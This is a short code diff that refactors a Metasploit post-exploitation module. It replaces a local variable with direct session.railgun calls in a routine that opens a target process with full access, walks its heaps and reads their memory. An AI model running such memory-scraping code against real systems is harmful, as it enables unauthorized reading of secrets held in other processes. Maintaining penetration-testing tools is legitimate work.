@@ -62,11 +62,10 @@ class MetasploitModule < Msf::Post
     end
     proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 
-    railgun = session.railgun
-    heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
-    dheap = railgun.kernel32.GetProcessHeap()['return']
+    heap_cnt = session.railgun.kernel32.GetProcessHeaps(nil, nil)['return']
+    dheap = session.railgun.kernel32.GetProcessHeap()['return']
     vprint_status("Default Process Heap: 0x%08x" % dheap)
-    ret = railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
+    ret = session.railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
     pheaps = ret['ProcessHeaps']
 
     idx = 0
@@ -82,7 +81,7 @@ class MetasploitModule < Msf::Post
     handles.each do |handle|
       lpentry = "\x00" * 42
       ret = ''
-      while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
+      while (ret = session.railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
         entry = ret['lpEntry'][0, 4].unpack('V')[0]
         pointer = proc.memory.read(entry, 512)
         size = ret['lpEntry'][4, 4].unpack('V')[0]
